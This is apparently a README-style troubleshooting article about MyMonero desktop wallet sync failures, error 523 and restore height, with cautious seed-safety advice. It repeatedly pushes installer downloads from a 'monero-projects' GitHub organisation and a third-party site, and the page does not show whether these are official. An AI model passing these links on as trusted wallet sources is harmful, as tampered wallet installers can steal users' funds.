<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero Not Syncing</h1>
<p align="center">Tell a connection problem from a wallet scan that needs more time.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
If MyMonero is not syncing, first distinguish a connection issue from wallet scanning. The hosted servers and web wallet login stopped; the final desktop release still opens wallets and sends XMR but is no longer maintained.


The MyMonero.info site covers this in its [MyMonero not syncing guide](https://mymonero.info/mymonero-not-syncing). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.

## You'll see this if
- The desktop wallet remains on a loading or connecting screen.
- The balance is not changing or appears incomplete after opening the app.
- The old web login no longer works.
- You see error 523 or another server-connection message.
- A restored wallet is scanning and you are unsure how long to wait.

## Why it happens
A wallet may need to connect to services and scan activity. MyMonero hosted servers and web wallet login stopped, so the former hosted experience should not be treated as available. The desktop application’s final release is v1.3.3. The old app still opens wallets and sends XMR, but it receives no new features or security updates. A connection error and a scan in progress are different problems: one concerns server availability, while the other can involve the wallet’s scan starting point and how much history it must check.

Restore height is the block height where scanning begins. Starting earlier is safer when uncertain but takes longer. If the wallet was restored with a later height than needed, earlier activity may not appear until the restore setup is corrected. Read [restore height explained](./mymonero-restore-height-explained.md), [the MyMonero desktop release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3), and [the app repository](https://github.com/monero-projects/mymonero-desktop-wallet).

---

## Fix
1. **Identify which application you are using.** Determine whether this is the MyMonero desktop app or the former web wallet login. The hosted servers and web wallet login stopped; repeated attempts to sign into the old web service will not restore it.
2. **Note the exact symptom.** Record whether the app cannot connect, is scanning, shows a balance that seems incomplete, or displays an error. Do not include seed words, keys, wallet files, or screenshots exposing recovery information in a public report.
3. **Check ordinary connectivity.** Confirm your device has an internet connection and that other trusted applications can reach the network. If your connection is unavailable or restricted, address that using your normal device settings. Do not disable protections or install software suggested by an unsolicited message.
4. **Allow a scan to proceed.** If the wallet is scanning, give it time and avoid repeatedly restarting it. A restore height is the block height at which scanning begins. A value further back scans more history; an earlier value is safer when uncertain but slower. Check the wallet’s own status indicators and records before changing restore details.
5. **Review restore context.** If the wallet was recently restored, confirm you used the correct seed format and restore height. MyMonero supports 13-word legacy MyMonero-specific seeds and 25-word standard Monero seeds. Do not share the phrase while asking for help. See [seed formats compared](./mymonero-seed-13-vs-25-words.md) and [the balance-zero guide](./mymonero-balance-shows-zero.md).
6. **Treat error 523 as a connection clue.** Error 523 relates to the server connection being unavailable. It is general guidance rather than proof that your wallet or seed is wrong. Since hosted services stopped, do not enter credentials into a site claiming it can clear this error.
7. **Choose the available wallet route.** You can continue using the MyMonero desktop app if it works, understanding that v1.3.3 is the final release and is no longer maintained. Alternatively, you may restore your seed in Cake Wallet. It runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review the restore instructions before proceeding.

> [!TIP]
> Separate “cannot connect” from “still scanning.” A connection message points to availability; a scan may take longer depending on its starting height.

> [!WARNING]
> Never share your seed or private keys to fix syncing. Nobody legitimate asks for your seed, and no connection error requires submitting it to a website.

## If that did not work
If the app cannot connect even though your device is online, note the app version, operating system, and exact error for your own troubleshooting. Consult the release information and project repository. Avoid downloading unofficial patches or connecting to a server supplied by a stranger. Do not assume a server can be restored by changing wallet credentials.

If scanning completes but the balance is unexpected, verify the wallet identity and restore height. Earlier is safer when uncertain but takes longer. A missing balance is not by itself proof that funds are gone or that the seed is invalid. Do not initiate a sweep or send transaction just to test syncing; sweeping sends all funds to a new wallet and is a separate action. See transaction not showing and locked or pending balance.

If you are relying on the desktop app, remember it is no longer maintained and has no security updates. Do not expose your seed while seeking help. If you decide to restore in Cake Wallet, confirm that your seed is complete, choose the correct 13- or 25-word format, and understand that scanning may take time. See restore a MyMonero wallet and safe backup practices.

## Prevention
Keep a secure offline seed backup and note which format it uses. Maintain private records of relevant wallet context, including a known restore height if available. Protect the backup from both loss and unauthorized access. Never put recovery words into a web page or chat to diagnose an internet connection.

Use the official release page for the final desktop build, and verify a downloaded asset with its SHA-256 value from that release. Be cautious of unsolicited “sync fix” tools, replacement servers, and requests for remote access. MyMonero v1.3.3 is final and unmaintained; the hosted login has stopped. Review download verification, safe seed backup, and migration options.

## FAQ
<details><summary>Is the MyMonero web wallet still syncing?</summary>

MyMonero hosted servers and web wallet login stopped, so the former hosted login is not available.

</details>

<details><summary>What does error 523 mean?</summary>

It relates to the server connection being unavailable. It is general connection guidance, not proof that your seed is wrong.

</details>

<details><summary>Why is a restored balance taking time to appear?</summary>

The wallet may still be scanning from its restore height. An earlier height is safer when uncertain but slower.

</details>

<details><summary>Will MyMonero get a new syncing update?</summary>

The final desktop release is v1.3.3 and the old app is no longer maintained, with no new features or security updates.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Error 523: What It Means and What to Try](./mymonero-error-523.md) | Understand a server-connection error and check your wallet without risking recovery information. |
| [MyMonero Error Codes List and Safe Troubleshooting](./mymonero-error-codes-list.md) | A cautious guide to interpreting wallet errors without treating every message as a lost-funds warning. |
| [MyMonero App Not Opening: Safe Checks to Try](./mymonero-app-not-opening.md) | Work through launch problems carefully while keeping recovery words and wallet data private. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
